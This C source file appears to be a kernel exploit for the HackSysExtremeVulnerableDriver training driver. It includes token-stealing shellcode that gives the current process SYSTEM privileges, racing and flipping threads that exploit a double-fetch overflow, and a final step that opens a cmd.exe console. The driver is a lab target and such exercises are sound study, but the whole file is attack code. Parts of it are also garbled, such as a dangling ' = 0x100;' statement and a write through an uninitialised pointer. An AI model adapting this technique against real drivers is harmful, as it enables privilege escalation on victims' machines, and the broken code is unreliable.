#include<Windows.h>
#include<stdio.h>

#define IOCTL_OPCODE 0x222037

typedef struct UserBuffer{
    char *buffer;
    unsigned int size;
}UserBuffer;

__declspec(naked) void ShellCode(){
    __asm{
        pushad ;save
        xor eax, eax

        mov eax, fs:[eax + 0x124]
        mov eax, [eax + 0x40]
        mov eax, [eax + 0x10] ;current process
        mov ecx, eax

        SearchSystemPid:
            mov eax, [eax + 0xb8]
            sub eax, 0xb8
            cmp [eax + 0xb4], 0x4
            jne SearchSystemPid
        
            mov eax, [eax + 0xf8]
            mov [ecx + 0xf8], eax

            popad
            xor eax, eax 
            pop ebp
            ret 8


    }
}

HANDLE Get_Device_Handle(LPCTSTR lpFileName)
{

    HANDLE hDevice = CreateFileW(lpFileName,
         GENERIC_READ | GENERIC_WRITE,
         FILE_SHARE_READ | FILE_SHARE_WRITE, 
         NULL, 
         OPEN_EXISTING, 
         0, 
         NULL);
    if(hDevice == INVALID_HANDLE_VALUE){
        printf("[-] Failed to get device handle. Error code: %d\n", GetLastError());
        return -1;
    }
    printf("[+] Successfully got device handle[%d].\n", hDevice);
    return hDevice;
}

static VOID CreateCmd()
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

UserBuffer *input_buffer;
DWORD bytesReturned = 0;
HANDLE hDevice = 0;

DWORD WINAPI FlippingThread() {
    while (TRUE) {
        input_buffer->size = 0x824;
    }
}

DWORD WINAPI RacingThread() {
    while (TRUE) {
        ULONG WriteRet = 0;
        DeviceIoControl(hDevice, IOCTL_OPCODE, input_buffer, input_buffer->size, NULL, 0, &bytesReturned, NULL);
    }
}


int main(){

    hDevice = Get_Device_Handle(L"\\\\.\\HackSysExtremeVulnerableDriver");

    *input_buffer = (UserBuffer*)malloc(sizeof(UserBuffer));
    char output_buffer[0x80] = {'0'};

    input_buffer->buffer = (char *)malloc(0x824);
     = 0x100;

    memset(input_buffer->buffer, 'A', 0x80C);

    *(DWORD*)(input_buffer->buffer + 0x80C) = (DWORD)&ShellCode;
    *(DWORD*)(input_buffer->buffer + 0x810) = (DWORD)&ShellCode;
    *(DWORD*)(input_buffer->buffer + 0x814) = (DWORD)&ShellCode;
    *(DWORD*)(input_buffer->buffer + 0x818) = (DWORD)&ShellCode;
    *(DWORD*)(input_buffer->buffer + 0x81C) = (DWORD)&ShellCode;
    *(DWORD*)(input_buffer->buffer + 0x820) = (DWORD)&ShellCode;
    *(DWORD*)(input_buffer->buffer + 0x824) = (DWORD)&ShellCode;

    // BOOL result = DeviceIoControl(hDevice, IOCTL_OPCODE, input_buffer, (DWORD)sizeof(input_buffer), output_buffer, (DWORD)sizeof(output_buffer), &bytesReturned, NULL);

    // if (result) {
    // printf("[+] IOCTL request sent successfully. Bytes returned: %d\n", bytesReturned);
    // }
    // else {
    // printf("[-] Failed to send IOCTL request. Error code: %d\n", GetLastError());
    // }
    HANDLE hThreadRacing[10] = { 0 };
    HANDLE hThreadFlipping[10] = { 0 };
    for (size_t i = 0; i < 10; i++)
    {
        hThreadRacing[i] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RacingThread, NULL, CREATE_SUSPENDED, 0);
        hThreadFlipping[i] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)FlippingThread, NULL, CREATE_SUSPENDED, 0);
    
        SetThreadPriority(hThreadRacing[i], THREAD_PRIORITY_HIGHEST);
        SetThreadPriority(hThreadFlipping[i], THREAD_PRIORITY_HIGHEST);

        ResumeThread(hThreadRacing[i]);
        ResumeThread(hThreadFlipping[i]);
    }

    if (WaitForMultipleObjects(10, hThreadRacing, TRUE, 60000)) {
        for (size_t i = 0; i < 10; i++)
        {
            TerminateThread(hThreadRacing[i], 0);
            CloseHandle(hThreadRacing[i]);
            TerminateThread(hThreadFlipping[i], 0);
            CloseHandle(hThreadFlipping[i]);
        }
    }

    CreateCmd();

    CloseHandle(hDevice);
    return 0;
}